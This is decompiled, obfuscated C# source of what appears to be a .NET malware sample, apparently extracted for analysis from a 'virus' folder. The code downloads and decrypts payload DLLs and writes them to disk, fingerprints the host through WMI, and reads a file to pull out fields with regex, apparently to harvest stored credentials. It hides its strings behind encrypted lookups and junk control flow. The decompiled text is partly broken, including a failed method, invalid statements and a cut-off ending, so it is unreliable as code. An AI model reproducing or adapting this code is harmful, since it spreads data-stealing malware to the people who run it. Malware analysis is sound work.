using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

[StandardModule]
internal sealed class _____________________________________________________________________
{
	private static string _;

	public static string __;

	public static string ___(string string_0)
	{
		string str;
		try
		{
			_____________________________________________________________________._ = string.Concat(______________________.____, ______________________________________________________________._______________________, <Module>.____<string>(1457469466));
			_____________________________________________________________________.______(string_0);
			string str1 = string.Concat(_____________________________________________________________________._______(), _____________________________________________________________________.___________(), _____________________________________________________________________.____________());
			str = str1;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			str = <Module>.__________((int)(sizeof(byte) + 61476), Type.EmptyTypes.Length + 63235, Type.EmptyTypes.Length + 64);
			ProjectData.ClearProjectError();
		}
		return str;
	}

	public static string ____(string string_0)
	{
		string[] strArrays = null;
		string str = null;
		string[] strArrays1 = null;
		string str1 = null;
		string str2 = null;
		int num = 0;
		string[] strArrays2 = null;
		string str3 = null;
		string str4 = null;
		int num1 = 0;
		string str5 = null;
		int _______ = 0;
		int num2 = 0;
		string str6 = null;
		int length;
		string[] strArrays3 = null;
		int num3 = 0;
		int num4 = 0;
		int _______1 = 0;
		string[] strArrays4 = null;
		string str7 = null;
		int num5 = 0;
		string str8 = null;
		string str9 = null;
		object obj;
		int length1;
		int num6;
		int length2;
		string str10 = string.Concat(______________________.____, ______________________________________________________________._______________________, <Module>.____<string>(-402938611));
		try
		{
			_____________________________________________________________________._____(string_0, str10);
			try
			{
				if (!File.Exists(str10))
				{
					goto Label0;
				}
				Random random = new Random();
				string tempPath = Path.GetTempPath();
				num4 = random.Next(1000, 9000);
				str8 = string.Concat(tempPath, num4.ToString());
				length = Type.EmptyTypes.Length + -22497;
			Label11:
				if (_____________________________________________________________________.______________(str8, str10))
				{
					Thread.Sleep(3500);
					if (!File.Exists(str8))
					{
						if (length == -19769)
						{
							int _________ = <Module>._________________;
							if (4436480 + 512 * (_________ - -(2505 & _________)) != _________ * 65536)
							{
								goto Label1;
							}
						}
						Thread.Sleep(10000);
					}
					if (!File.Exists(str8))
					{
						goto Label3;
					}
					str1 = File.ReadAllText(str8);
					if ((1 & num2 + 1899) != (94388224 * num2 - 9439 >> 14 & 1))
					{
						obj = sizeof(int) + -1792340070;
						goto Label2;
					}
					else
					{
						obj = checked((int)1);
						goto Label2;
					}
				}
			Label3:
				int length3 = Type.EmptyTypes.Length + 32749;
				str2 = <Module>.__________(length3, 35840, ((3053 ^ (num3 * 25190400 - (num1 << 7)) * num3) == 0 ? Type.EmptyTypes.Length + -1864316095 : 233));
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				Exception exception = exception1;
				______________________________________________________________.______________(<Module>.____<string>(1187660804), string.Concat(<Module>._____<string>(-1747440099), exception.ToString()));
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			num6 = ((2 & num1 / 15397 >> 18) != ((num1 + num1) * (2210 & num1) & 2) ? Type.EmptyTypes.Length + -1010296382 : Type.EmptyTypes.Length + 61981);
			if (3592 + _______ * 553648128 == -1798467862)
			{
				length2 = Type.EmptyTypes.Length + 1616380673;
			}
			else if (num4 / 316779108 != 1996039184)
			{
				length2 = ((288 * _______ + -4211 + _______ * 224 & 3216) == 0 ? -205612073 : Type.EmptyTypes.Length + 65043);
			}
			else
			{
				length2 = Type.EmptyTypes.Length + 2059302158;
			}
			str2 = <Module>.__________(num6, length2, checked((int)48));
			ProjectData.ClearProjectError();
		}
		return str2;
	Label0:
		str2 = <Module>.__________((int)(sizeof(float) + 2975), Type.EmptyTypes.Length + 2920, (int)(sizeof(ulong) + 135));
		length = -1233;
		if ((num / 8388608 ^ 7796) != 0)
		{
			return str2;
		}
	Label13:
		strArrays = strArrays3;
		num1 = 0;
		goto Label5;
	Label1:
		length1 = Type.EmptyTypes.Length + 55486;
		goto Label6;
	Label2:
		while (true)
		{
			switch (obj)
			{
				case 0:
				{
					goto Label7;
				}
				case 1:
				{
					str9 = <Module>._____<string>(688887851);
					if (!str1.Contains(str9))
					{
						goto Label3;
					}
					obj = Type.EmptyTypes.Length + 2;
					continue;
				}
				case 2:
				{
					goto Label8;
				}
				case 3:
				{
					goto Label1;
				}
				case 4:
				{
					strArrays4[3] = str3;
					strArrays4[4] = <Module>.____<string>(-201016429);
					if ((-21868544 * (_______1 % 114) ^ 1093777739) == 0)
					{
						obj = sizeof(uint) + -2102345528;
						continue;
					}
					else if (~(num4 % 64) == num4 * 28 + 4 * num4 << 6 << 23)
					{
						obj = sizeof(int) + -1776496240;
						continue;
					}
					else
					{
						obj = Type.EmptyTypes.Length + 11;
						continue;
					}
				}
				case 5:
				{
					goto Label9;
				}
				case 6:
				{
					goto Label10;
				}
				case 8:
				{
					goto Label12;
				}
				case 9:
				{
					goto Label13;
				}
				case 10:
				{
					goto Label14;
				}
				case 11:
				{
					goto Label15;
				}
				case 12:
				{
					if (!str4.Contains(<Module>._______<string>(2059718724)))
					{
						goto Label17;
					}
					strArrays3 = Strings.Split(str4, <Module>.___<string>(902284615), -1, CompareMethod.Binary);
					obj = sizeof(short) + -2;
					continue;
				}
				case 13:
				{
					goto Label16;
				}
				default:
				{
					goto Label11;
				}
			}
		}
	Label5:
		if (num1 < checked((int)strArrays.Length))
		{
			str = strArrays[num1];
			length = 15013;
			int _________1 = <Module>._________________;
			if (((num3 / 259788388 >> 17 ^ _________1 << 8) & 16) != 0)
			{
				goto Label18;
			}
			if (!str.Contains(<Module>._______<string>(-1120427337)))
			{
				goto Label9;
			}
			str5 = _____________________________________________________________________._____________(str);
			length = Type.EmptyTypes.Length + -29031;
			obj = sizeof(double) + -3;
			goto Label2;
		}
		else
		{
			length = 23768;
			if (Type.EmptyTypes.Length + 14629 != 14629)
			{
				goto Label13;
			}
			if (!(Operators.CompareString(str5, <Module>.__________(Type.EmptyTypes.Length + 55459, (num4 * 3 + num4 * 5 - -4294 != 7523 ? 54252 : Type.EmptyTypes.Length + 1511394071), Type.EmptyTypes.Length + 178), false) != 0 & Operators.CompareString(str3, <Module>.__________(((num3 << 7) * 5 + (num3 << 7) * 11 != -1672069985 ? 21643 : -1540686376), (~(num1 * 1100 % 65536) == 1677721600 * num1 << 2 ? -723195527 : Type.EmptyTypes.Length + 24567), Type.EmptyTypes.Length + 251), false) != 0))
			{
				goto Label17;
			}
			length = 21833;
			if (sizeof(ushort) + 23766 == 22718)
			{
				goto Label12;
			}
		}
	Label18:
		strArrays4 = new string[] { str7, null, null, null, null, null, null };
		obj = sizeof(uint) + 4;
		goto Label2;
	Label6:
		str3 = <Module>.__________(length1, 54363, 181);
		length = -23855;
		if (sizeof(short) + 20422 != -6670)
		{
			goto Label19;
		}
	Label7:
		str5 = <Module>.__________((int)(sizeof(double) + 34155), (int)(sizeof(ulong) + 37123), Type.EmptyTypes.Length + 199);
		goto Label16;
	Label8:
		str7 = <Module>._____<string>(934375637);
		strArrays2 = Strings.Split(str1, str9, -1, CompareMethod.Binary);
		goto Label14;
	Label9:
		length = -29031;
		if (str.Contains(<Module>._____<string>(1740951417)))
		{
			str3 = _____________________________________________________________________._____________(str);
			length == 5926;
		}
		if (!str.Contains(<Module>._____<string>(578154245)))
		{
			goto Label10;
		}
		str6 = _____________________________________________________________________._____________(str);
		obj = Type.EmptyTypes.Length + 6;
		goto Label2;
	Label10:
		num1++;
		goto Label5;
	Label12:
		strArrays4[1] = str5;
		strArrays4[2] = <Module>.______<string>(1514956238);
		obj = sizeof(long) + -4;
		goto Label2;
	Label14:
		strArrays1 = strArrays2;
		num3 = 0;
		goto Label20;
	Label15:
		strArrays4[5] = str6;
		strArrays4[6] = <Module>.____<string>(-531874208);
		str7 = string.Concat(strArrays4);
		goto Label17;
	Label16:
		_______ = <Module>._____________;
		if ((53108736 * _______ ^ 2722) != 0)
		{
			goto Label1;
		}
		length1 = (int)(sizeof(ushort) + -2027711872);
		goto Label6;
	Label17:
		num3++;
	Label20:
		if (num3 >= checked((int)strArrays1.Length))
		{
			try
			{
				File.Delete(str8);
			}
			catch (Exception exception3)
			{
				ProjectData.SetProjectError(exception3);
				ProjectData.ClearProjectError();
			}
			str7 = string.Concat(str7, <Module>._______<string>(1109215133));
			str2 = str7;
			return str2;
		}
		else
		{
			str4 = strArrays1[num3];
			int _______2 = <Module>.____________;
			if (694478600 + -798085120 * num == 454261308)
			{
				goto Label11;
			}
			else if (28104 + length * 7 + 9 * length == length % 176 >> 27)
			{
				_______1 = <Module>._____________;
				if ((3 * _______1 + _______1 & 8) == (4 * (_______1 - -9604) & 8))
				{
					int ______ = <Module>.__________;
					if (781 * ______ + 2682 + 243 * ______ != 8829)
					{
						if (((num5 / 65536 + 2984 ^ num5 % 13650589 * 8) & -2147483648) != 0)
						{
							goto Label11;
						}
						obj = sizeof(ulong) + -1554143491;
						goto Label2;
					}
					else
					{
						obj = Type.EmptyTypes.Length + -2008352752;
						goto Label2;
					}
				}
				else
				{
					if ((_______2 * -1140850688 + -8825 | -1504) == -89)
					{
						goto Label11;
					}
					obj = sizeof(byte) + -2101691860;
					goto Label2;
				}
			}
			else
			{
				obj = sizeof(ushort) + 10;
				goto Label2;
			}
		}
	Label19:
		str6 = <Module>.__________(Type.EmptyTypes.Length + 46348, 49330, (int)(sizeof(long) + 65));
		obj = Type.EmptyTypes.Length + 9;
		goto Label2;
	}

	public static void _____(string string_0, string string_1)
	{
		byte[] numArray = null;
		int num = 0;
		object length;
		try
		{
			if (12756 == Type.EmptyTypes.Length + 12756)
			{
				if (File.Exists(string_1))
				{
					goto Label0;
				}
				if (Operators.CompareString(string_0, string.Empty, false) != 0)
				{
					numArray = (new WebClient()).DownloadData(string_0);
					if (~(num >> 18) != num / 262144)
					{
						length = sizeof(long) + -7;
					}
					else
					{
						length = Type.EmptyTypes.Length + 834279977;
					}
				}
				else
				{
					length = Type.EmptyTypes.Length + 0;
				}
				switch (length)
				{
					case 1:
					{
						break;
					}
					default:
					{
						return;
					}
				}
			}
			byte[] numArray1 = ___________________________________________________________________._______(numArray, <Module>._____<string>(-791364520));
			byte[] numArray2 = ________________________________________________________________________________.______(numArray1);
			if (checked((int)numArray2.Length) != 99328)
			{
				______________________________________________________________.______________(<Module>.______<string>(-820038095), <Module>.____<string>(1623218002));
			}
			else
			{
				File.WriteAllBytes(string_1, ___________________________________________________________________._______(numArray2, <Module>.__________(51533, Type.EmptyTypes.Length + 50346, (int)(sizeof(byte) + 77))));
			}
		Label0:
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.______<string>(-820038095), string.Concat(<Module>._______<string>(-1523205448), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(string string_0)
	{
		try
		{
			-4043 == Type.EmptyTypes.Length + -4044;
			if (!File.Exists(_____________________________________________________________________._))
			{
				if (Operators.CompareString(string_0, string.Empty, false) != 0)
				{
					byte[] numArray = (new WebClient()).DownloadData(string_0);
					switch (sizeof(ushort))
					{
						default:
						{
							byte[] numArray1 = ___________________________________________________________________._______(numArray, <Module>.______<string>(869619641));
							byte[] numArray2 = ________________________________________________________________________________.______(numArray1);
							if (checked((int)numArray2.Length) != 348160)
							{
								______________________________________________________________.______________(<Module>.___<string>(1387161447), <Module>.____<string>(-660809805));
								break;
							}
							else
							{
								File.WriteAllBytes(_____________________________________________________________________._, ___________________________________________________________________._______(numArray2, <Module>.__________((int)(sizeof(short) + 30537), Type.EmptyTypes.Length + 29323, 16)));
								break;
							}
						}
					}
				}
				else
				{
					return;
				}
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.______<string>(-820038095), string.Concat(<Module>.____<string>(-1571377503), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static string _______()
	{
		int num = 0;
		int _______ = 0;
		string[] strArrays = null;
		string str;
		int num1;
		int num2;
		int num3;
		try
		{
			string str1 = <Module>.____<string>(1190759839);
			string str2 = Conversions.ToString(_____________________________________________________________________._________());
			string str3 = Conversions.ToString(_____________________________________________________________________.________());
			int length = Type.EmptyTypes.Length + 21307;
			int length1 = Type.EmptyTypes.Length + 2;
			while (true)
			{
			Label1:
				switch (length1)
				{
					case 0:
					{
						num1 = 1107680784;
						break;
					}
					case 1:
					{
						strArrays[1] = str2;
						strArrays[2] = <Module>._____<string>(-1479692421);
						strArrays[3] = str3;
						strArrays[4] = <Module>.____<string>(1190759839);
						str1 = string.Concat(strArrays);
						str = str1;
						return str;
					}
					case 2:
					{
						while (Operators.CompareString(str2, string.Empty, false) == 0 | Operators.CompareString(str3, string.Empty, false) == 0)
						{
							if (length != 21307)
							{
								continue;
							}
							_______ = <Module>.____________;
							if (~-(_______ | -39950) != _______)
							{
								num1 = 59060;
								goto Label2;
							}
							else
							{
								length1 = Type.EmptyTypes.Length + 0;
								goto Label1;
							}
						}
						strArrays = new string[] { str1, null, null, null, null };
						length1 = checked((int)1);
						continue;
					}
					default:
					{
						goto case 2;
					}
				}
			}
		Label2:
			str = <Module>.__________(num1, Type.EmptyTypes.Length + 58173, (int)(sizeof(Guid) + 85));
			length = -10043;
			int ________ = <Module>._______________;
			if ((8388608 * ________ ^ -9999 | -2225) == -1)
			{
				num2 = ((________ % 32768 << 26) + 31488 != ________ % 1757 >> 3 ? (int)(sizeof(ulong) + -23113) : -1896254368);
			}
			else
			{
				num2 = ((256 & (num % 4096 >> 19 ^ 2048 * num)) != 0 ? Type.EmptyTypes.Length + 1214423411 : Type.EmptyTypes.Length + 1795704181);
			}
			num2 == -23105;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			if (~(_______ << 9) == (4571 ^ _______) * 512)
			{
				num3 = (int)(sizeof(byte) + -920848524);
			}
			else
			{
				int ________1 = <Module>._______________;
				num3 = ((1527 * ________1 + ________1 * 521 ^ 1001626397) != 0 ? Type.EmptyTypes.Length + 13740 : -1887325221);
			}
			str = <Module>.__________(num3, 16442, 38);
			ProjectData.ClearProjectError();
		}
		return str;
	}

	public static object ________()
	{
		// 
		// Current member / type: System.Object _____________________________________________________________________::________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Object ________()
		// 
		// Specified argument was out of the range of valid values.
		// Parameter name: Unknown type for literal expression.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Ast\Expressions\LiteralExpression.cs:line 147
		//    at ..set_Value(Object ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Ast\Expressions\LiteralExpression.cs:line 80
		//    at ..(TypeReference , TypeSystem ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Mono.Cecil.Extensions\TypeReferenceExtensions.cs:line 30
		//    at ..( , Int32 , Int32 ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Steps\DeclareTopLevelVariables.cs:line 126
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Steps\DeclareTopLevelVariables.cs:line 91
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Steps\DeclareTopLevelVariables.cs:line 64
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static object _________()
	{
		object obj;
		ManagementObjectCollection.ManagementObjectEnumerator enumerator = null;
		ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = null;
		try
		{
			string str = null;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(<Module>.____<string>(795934529), <Module>.______<string>(-867318039)))
				{
					managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator();
					while (managementObjectEnumerator.MoveNext())
					{
						ManagementObject current = (ManagementObject)managementObjectEnumerator.Current;
						str = Conversions.ToString(Operators.ConcatenateObject(str, current[<Module>.___<string>(1176231577)]));
					}
				}
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				str = <Module>.______<string>(496562882);
				ProjectData.ClearProjectError();
			}
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher1 = new ManagementObjectSearcher(<Module>.___<string>(1698050400), <Module>.____<string>(-486222836)))
				{
					enumerator = managementObjectSearcher1.Get().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						str = Conversions.ToString(Operators.ConcatenateObject(str, Operators.ConcatenateObject(<Module>.______<string>(851744222), managementObject[<Module>._____<string>(-1544428488)])));
					}
				}
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				str = <Module>.______<string>(496562882);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(str, <Module>.______<string>(496562882), false) == 0)
				{
					str = (new Computer()).Info.OSFullName;
				}
			}
			catch (Exception exception2)
			{
				ProjectData.SetProjectError(exception2);
				str = <Module>.______<string>(496562882);
				ProjectData.ClearProjectError();
			}
			obj = str;
		}
		catch (Exception exception3)
		{
			ProjectData.SetProjectError(exception3);
			obj = <Module>.___<string>(793063634);
			ProjectData.ClearProjectError();
		}
		return obj;
	}

	public static string __________(byte[] byte_0)
	{
		unsafe
		{
			int num = 0;
			int num1 = 0;
			int length = 0;
			int num2 = 0;
			char[] chrArray;
			char[] chrArray1 = null;
			int num3 = 0;
			ArrayList arrayLists = null;
			string str;
			int ______ = 0;
			char[] chrArray2 = null;
			int num4 = 0;
			object obj;
			int num5;
			try
			{
				chrArray = new char[24];
				chrArray[0] = 'B';
				obj = sizeof(Guid) + -5;
			Label11:
				while (true)
				{
					switch (obj)
					{
						case 0:
						{
							chrArray[11] = 'R';
							chrArray[12] = 'T';
							obj = sizeof(uint) + 5;
							continue;
						}
						case 1:
						{
							num1 = num1 + -1;
							if (num1 >= 0)
							{
								goto Label6;
							}
							if (length == -3382)
							{
								goto Label5;
							}
							goto case 7;
						}
						case 2:
						{
							goto Label0;
						}
						case 3:
						{
							chrArray[19] = '4';
							chrArray[20] = '6';
							if (((num3 * 1037 + num3 * 1011) / 1927 ^ -3378) != 0)
							{
								obj = (int)8;
								continue;
							}
							else
							{
								obj = sizeof(float) + 1789452119;
								continue;
							}
						}
						case 4:
						{
							chrArray[3] = 'F';
							chrArray[4] = 'G';
							length = (int)(sizeof(byte) + 12962);
							obj = Type.EmptyTypes.Length + 5;
							continue;
						}
						case 5:
						{
							chrArray[5] = 'H';
							chrArray[6] = 'J';
							int num6 = length;
							length = -10858;
							if (((2583 ^ ______ / 408487831) & -1968) == 2064)
							{
								if (num6 == -15848)
								{
									goto Label7;
								}
							}
							chrArray[7] = 'K';
							chrArray[8] = 'M';
							if (length != -10858)
							{
								goto case 4;
							}
							chrArray[9] = 'P';
							chrArray[10] = 'Q';
							obj = Type.EmptyTypes.Length + 0;
							continue;
						}
						case 6:
						{
							goto Label1;
						}
						case 7:
						{
							num = num3 % 24;
							chrArray2[num4] = chrArray1[num];
							length = Type.EmptyTypes.Length + -3382;
							int _______ = <Module>.____________;
							if (((_______ - 2056 ^ _______) & 4) == 0)
							{
								obj = sizeof(float) + -3;
								continue;
							}
							else if ((______ * 329 + 1719 * ______) / 82 == 1493426870)
							{
								obj = Type.EmptyTypes.Length + -1632021974;
								continue;
							}
							else
							{
								obj = sizeof(float) + 1797495160;
								continue;
							}
						}
						case 8:
						{
							chrArray[21] = '7';
							chrArray[22] = '8';
							length = (int)(sizeof(int) + -31789);
							if ((num1 & 53 * num1 + num1 * 75) - 2250 != -6565)
							{
								obj = sizeof(uint) + 2;
								continue;
							}
							else
							{
								obj = Type.EmptyTypes.Length + 1954027345;
								continue;
							}
						}
						case 9:
						{
							chrArray[13] = 'V';
							chrArray[14] = 'W';
							length = (int)(sizeof(Guid) + 10737);
							goto case 10;
						}
						case 10:
						{
							chrArray[15] = 'X';
							chrArray[16] = 'Y';
							if (((______ | 2124) * 32 >> 3 & 2) != (2 & ______ * 29352))
							{
								goto Label5;
							}
							if (length != 10753)
							{
								goto Label4;
							}
							chrArray[17] = '2';
							chrArray[18] = '3';
							obj = sizeof(uint) + -1;
							continue;
						}
						case 11:
						{
							goto Label2;
						}
					}
				}
			Label2:
				chrArray[1] = 'C';
				chrArray[2] = 'D';
				obj = sizeof(ushort) + 2;
				goto Label11;
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				if ((num / 26 & num ^ 268435580) == 0)
				{
					______ = <Module>.___________;
					if (______ * 64 != -1308)
					{
						num5 = ((num4 * 2 & -2147483648) == ((num4 + num4 ^ 5411) & -2147483648) ? Type.EmptyTypes.Length + 1356596617 : Type.EmptyTypes.Length + -1161914773);
					}
					else
					{
						num5 = -849308599;
					}
				}
				else
				{
					num5 = 57179;
				}
				str = <Module>.__________(num5, (~(num3 / 304 / 1073741824) != 524288 * num3 * 58400768 ? Type.EmptyTypes.Length + 59852 : (int)(sizeof(float) + -2028307654)), Type.EmptyTypes.Length + 47);
				ProjectData.ClearProjectError();
			}
			return str;
		Label0:
			num4 = 28;
			goto Label12;
		Label1:
			chrArray[23] = '9';
			chrArray1 = chrArray;
			chrArray2 = new char[29];
			if (length == -8696)
			{
				goto Label0;
			}
			arrayLists = new ArrayList();
			num2 = 52;
		Label15:
			arrayLists.Add(byte_0[num2]);
			length = 1271;
			goto Label7;
		Label4:
		Label5:
			num4 = num4 + -1;
			if (num4 < 0)
			{
				str = new string(chrArray2);
				return str;
			}
			else
			{
				goto Label12;
			}
		Label6:
			length = -4153;
			num3 = num << 8 | Conversions.ToByte(arrayLists[num1]);
			arrayLists[num1] = (byte)(num3 / 24);
			if (-1744830464 + -num * 134217728 == num << 27)
			{
				goto Label2;
			}
			obj = Type.EmptyTypes.Length + 7;
			goto Label11;
		Label7:
			num2++;
			if (num2 <= 67)
			{
				goto Label15;
			}
			else
			{
				goto Label0;
			}
		Label12:
			if ((num4 + 1) % 6 == 0)
			{
				goto Label16;
			}
			num = 0;
			num1 = 14;
			length = -4153;
			((4704 ^ num3 * 931 + num3 * 1117) == 0 ? Type.EmptyTypes.Length + -861602533 : -16345) == -16345;
			goto Label6;
		Label16:
			chrArray2[num4] = '-';
			goto Label5;
		}
	}

	public static string ___________()
	{
		Match current = null;
		string str = null;
		string[] value = null;
		IEnumerator enumerator = null;
		GroupCollection groups = null;
		int num;
		Regex regex;
		string str1 = null;
		try
		{
		Label0:
			string str2 = string.Concat(Interaction.Environ(<Module>._______<string>(-574721360)), <Module>._______<string>(-1813100186));
			switch (Type.EmptyTypes.Length)
			{
				case 0:
				{
					if (File.Exists(str2))
					{
						StreamReader streamReader = new StreamReader(str2);
						string end = streamReader.ReadToEnd();
						int num1 = 17017;
						if (Type.EmptyTypes.Length + 23894 == 27375)
						{
							goto Label4;
						}
						while (true)
						{
							streamReader.Close();
							StringBuilder stringBuilder = new StringBuilder();
							regex = new Regex(<Module>._____<string>(-1900649880));
							num = num1;
							num1 = -29614;
							if (num == 17017)
							{
								break;
							}
						}
						enumerator = regex.Matches(end).GetEnumerator();
						if (num1 == -30823)
						{
							goto Label5;
						}
					Label7:
						str = <Module>._____<string>(-1994782876);
					Label9:
						if (enumerator.MoveNext())
						{
							current = (Match)enumerator.Current;
							num1 = -2783;
							if (Type.EmptyTypes.Length + -11132 == -11132)
							{
								goto Label6;
							}
							goto case 0;
						}
						else
						{
							str = string.Concat(str, <Module>._______<string>(-1429692350));
							str1 = str;
							break;
						}
					Label6:
						groups = current.Groups;
						value = new string[] { groups[1].Value, null, null, null, null, null };
						num = num1;
						num1 = -5146;
						if (num == -7403)
						{
							goto Label0;
						}
					Label5:
						value[1] = <Module>.___<string>(-1052575738);
						value[2] = groups[2].Value;
						num = num1;
						num1 = 31201;
						if (num != -5146)
						{
							goto Label7;
						}
					Label4:
						value[3] = <Module>._______<string>(1023697363);
						value[4] = groups[3].Value;
						if (num1 == 31201)
						{
							goto Label8;
						}
						goto Label6;
					}
					else
					{
						str1 = <Module>.__________((int)(sizeof(double) + 49626), 52934, Type.EmptyTypes.Length + 212);
						goto case 1;
					}
				}
				case 1:
				{
					break;
				}
				default:
				{
					goto case 0;
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			str1 = <Module>.__________((int)(sizeof(byte) + 63788), Type.EmptyTypes.Length + 62312, Type.EmptyTypes.Length + 7);
			ProjectData.ClearProjectError();
		}
		return str1;
	Label8:
		value[5] = <Module>.______<string>(1514956238);
		string str3 = string.Concat(value);
		str = string.Concat(str, str3, <Module>.______<string>(-851536511));
		goto Label9;
	}

	public static string ____________()
	{
		unsafe
		{
			string[] strArrays = null;
			string str = null;
			int num = 0;
			int ____ = 0;
			string str1 = null;
			string[] strArrays1 = null;
			string[] strArrays2 = null;
			string str2 = null;
			int num1 = 0;
			string str3 = null;
			int length = 0;
			string[] strArrays3 = null;
			string str4 = null;
			string str5 = null;
			string str6 = null;
			string[] strArrays4 = null;
			string str7 = null;
			string str8 = null;
			int num2 = 0;
			string str9 = null;
			int num3 = 0;
			object obj;
			int num4;
			try
			{
				if (142 == Type.EmptyTypes.Length + 141)
				{
					goto Label0;
				}
				if (File.Exists(_____________________________________________________________________._))
				{
					Random random = new Random();
					string tempPath = Path.GetTempPath();
					num1 = random.Next(1000, 9000);
					str6 = string.Concat(tempPath, num1.ToString());
					length = (int)(sizeof(float) + -30565);
					obj = Type.EmptyTypes.Length + 0;
				}
				else
				{
					str = <Module>.__________(Type.EmptyTypes.Length + 2273, Type.EmptyTypes.Length + 919, ((1 & -num3) == (-(-5567 & num3) & 1) ? Type.EmptyTypes.Length + 160 : (int)(sizeof(ushort) + -765001082)));
					obj = Type.EmptyTypes.Length + 6;
				}
			Label14:
				while (true)
				{
					switch (obj)
					{
						case 0:
						{
							goto Label1;
						}
						case 1:
						{
							goto Label2;
						}
						case 2:
						{
							goto Label3;
						}
						case 3:
						{
							strArrays2[3] = str1;
							strArrays2[4] = <Module>._____<string>(-1479692421);
							int ________ = <Module>.______________;
							if (16 * (________ / 456 + ________ / 456) - -2147483648 == ________ / 3)
							{
								obj = Type.EmptyTypes.Length + 745155490;
								continue;
							}
							else
							{
								obj = Type.EmptyTypes.Length + 7;
								continue;
							}
						}
						case 4:
						{
							goto Label4;
						}
						case 5:
						{
							break;
						}
						case 7:
						{
							goto Label6;
						}
						case 8:
						{
							goto Label7;
						}
						case 9:
						{
							goto Label8;
						}
						case 10:
						{
							goto Label9;
						}
						case 11:
						{
							goto Label0;
						}
						default:
						{
							return str;
						}
					}
				}
				str4 = <Module>._______<string>(2111152995);
				if (!str3.Contains(str4))
				{
					if (num1 % 230 != 1097529989)
					{
						num4 = ((1010 * num3 + 14 * num3 - (num2 * 3 + num2 - 1257847919) & 2) != 2 ? Type.EmptyTypes.Length + 941375870 : Type.EmptyTypes.Length + 65179);
					}
					else
					{
						num4 = (int)-1576650676;
					}
					str = <Module>.__________(num4, 68642, (int)(sizeof(double) + 133));
					return str;
				}
			Label3:
				str5 = <Module>.______<string>(1108436452);
				strArrays = Strings.Split(str3, str4, -1, CompareMethod.Binary);
				if (length / 4194304 - -33882112 != (8213 ^ length / 524288) >> 6)
				{
					____ = ______________________._______;
					if (____ * 43 + ____ * 85 == 974290426)
					{
						return str;
					}
				}
				else
				{
					return str;
				}
			Label8:
				strArrays1 = strArrays;
				num2 = 0;
			Label22:
				if (num2 >= checked((int)strArrays1.Length))
				{
					try
					{
						File.Delete(str6);
					}
					catch (Exception exception)
					{
						ProjectData.SetProjectError(exception);
						ProjectData.ClearProjectError();
					}
					str5 = string.Concat(str5, <Module>._______<string>(-41008375));
					str = str5;
					Type.EmptyTypes.Length + 27780 == 27780;
					return str;
				}
				else
				{
					str7 = strArrays1[num2];
					length = -11838;
					if (Type.EmptyTypes.Length + -7075 != -7075)
					{
						goto Label12;
					}
				}
			Label21:
				if (!str7.Contains(<Module>.___<string>(-1586063947)))
				{
					goto Label13;
				}
				strArrays4 = Strings.Split(str7, <Module>._______<string>(1043067638), -1, CompareMethod.Binary);
				length = (int)(sizeof(byte) + -32326);
				goto Label0;
			}
			catch (Exception exception2)
			{
				ProjectData.SetProjectError(exception2);
				Exception exception1 = exception2;
				______________________________________________________________.______________(<Module>._______<string>(-1937358506), string.Concat(<Module>.______<string>(761048916), exception1.ToString()));
